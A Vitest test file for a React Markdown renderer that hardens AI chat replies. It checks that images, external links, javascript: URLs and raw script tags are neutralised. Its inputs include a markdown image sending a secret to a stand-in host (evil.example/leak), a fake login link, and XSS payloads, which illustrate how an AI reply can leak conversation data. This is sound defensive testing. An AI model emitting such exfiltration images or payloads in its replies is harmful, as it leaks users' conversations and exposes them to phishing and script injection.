import React from "react";
import { renderToStaticMarkup } from "react-dom/server";
import { describe, expect, it } from "vitest";
import MarkdownContent, { isInternalHref } from "./MarkdownContent";

function render(markdown) {
  return renderToStaticMarkup(React.createElement(MarkdownContent, null, markdown));
}

describe("AI 回覆的輸出防護", () => {
  it("不渲染圖片：外站圖片網址會被拿來偷帶對話內容", () => {
    const html = render("看這裡 ![x](https://evil.example/leak?q=secret)");
    expect(html).not.toContain("<img");
    expect(html).not.toContain("evil.example");
  });

  it("外部連結只顯示文字與網址，不能點", () => {
    const html = render("[登入驗證](https://evil.example/login)");
    expect(html).not.toContain("<a");
    expect(html).toContain("登入驗證");
    expect(html).toContain("(https://evil.example/login)");
  });

  it("站內路徑照常可以點", () => {
    const html = render("到[我的資源](/my-resources)看看");
    expect(html).toContain('<a href="/my-resources">我的資源</a>');
  });

  it("javascript: 與原始 HTML 不會變成可執行的內容", () => {
    const html = render('[點我](javascript:alert(1)) <script>alert(1)</script>');
    expect(html).not.toContain("javascript:");
    expect(html).not.toContain("<script");
  });

  it("協定相對網址算外站", () => {
    expect(isInternalHref("//evil.example")).toBe(false);
    expect(isInternalHref("/jobs")).toBe(true);
    expect(isInternalHref("https://skylab.example/jobs")).toBe(false);
  });
});
